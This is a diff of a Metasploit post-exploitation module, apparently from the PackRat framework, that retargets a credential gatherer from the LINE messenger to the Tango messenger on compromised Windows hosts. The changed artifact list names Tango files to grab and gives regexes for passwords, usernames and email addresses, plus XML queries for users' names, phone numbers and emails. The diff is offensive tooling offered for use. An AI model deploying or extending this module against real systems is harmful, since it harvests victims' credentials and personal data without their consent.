@@ -12,12 +12,12 @@ class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-                      'Name' => 'LINE credential gatherer',
+                      'Name' => 'Tango credential gatherer',
                       'Description' => %q{
                       PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
       PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
       Further details can be found in the module documentation.
-      This is a module that searches for credentials in LINE desktop application on a windows remote host. LINE is the most popular Instant Messenger app in Japan.
+      This is a module that searches for Tango credentials on a windows remote host. Tango is a third-party, cross platform messaging application software for smartphones developed by TangoME, Inc.t
       },
                       'License' => MSF_LICENSE,
                       'Author' =>
@@ -31,64 +31,62 @@ class MetasploitModule < Msf::Post
                       'SessionTypes' => ['meterpreter'],
                       'artifacts' =>
                         {
-                          "application": "line",
+                          "application": "tango",
                           "app_category": "chats",
                           "gatherable_artifacts": [
                             {
-                              "filetypes": "images",
+                              "filetypes": "database",
                               "path": "LocalAppData",
-                              "dir": "LINE",
-                              "artifact_file_name": "*.png",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
+                              "dir": "tango",
+                              "artifact_file_name": "contacts.dat",
+                              "description": "Tango contact names",
+                              "credential_type": "dat"
                             },
                             {
-                              "filetypes": "images",
+                              "filetypes": "software_version",
                               "path": "LocalAppData",
-                              "dir": "LINE",
-                              "artifact_file_name": "*.jpeg",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
+                              "dir": "tango",
+                              "artifact_file_name": "install.log",
+                              "description": "Tango Version",
+                              "credential_type": "text",
+                              "regex_search": [
+                                {
+                                  "extraction_description": "Searches for credentials (USERNAMES/PASSWORDS)",
+                                  "extraction_type": "credentials",
+                                  "regex": [
+                                    "(?i-mx:password.*)",
+                                    "(?i-mx:username.*)"
+                                  ]
+                                },
+                                {
+                                  "extraction_description": "searches for Email TO/FROM address",
+                                  "extraction_type": "Email addresses",
+                                  "regex": [
+                                    "(?i-mx:to:.*)",
+                                    "(?i-mx:from:.*)"
+                                  ]
+                                }
+                              ]
                             },
                             {
-                              "filetypes": "images",
+                              "filetypes": "userinfo",
                               "path": "LocalAppData",
-                              "dir": "LINE\\Cache\\p",
-                              "artifact_file_name": "*",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
-                            },
-                            {
-                              "filetypes": "images",
-                              "path": "LocalAppData",
-                              "dir": "LINE\\Cache\\g",
-                              "artifact_file_name": "*",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
-                            },
-                            {
-                              "filetypes": "images",
-                              "path": "LocalAppData",
-                              "dir": "LINE\\Cache\\m",
-                              "artifact_file_name": "*",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
-                            },
-                            {
-                              "filetypes": "images",
-                              "path": "LocalAppData",
-                              "dir": "LINE\\Cache\\e",
-                              "artifact_file_name": "*",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
-                            },
-                            {
-                              "filetypes": "images",
-                              "path": "LocalAppData",
-                              "dir": "LINE\\Data\\pizza",
-                              "artifact_file_name": "*",
-                              "description": "Image cache for profile images of users",
-                              "credential_type": "chat_log"
+                              "dir": "tango",
+                              "artifact_file_name": "userinfo1.xml",
+                              "description": "User info",
+                              "credential_type": "xml",
+                              "xml_search": [
+                              {
+                                  "extraction_description": "Searches for credentials (USERNAMES/PASSWORDS)",
+                                  "extraction_type": "credentials",
+                                  "xml": [
+                                   "//firstname",
+                                   "//lastname",
+                                   "//phonenumber",
+                                   "//email"
+                                  ]
+                                  }
+                              ]
                             }
                           ]
                         }
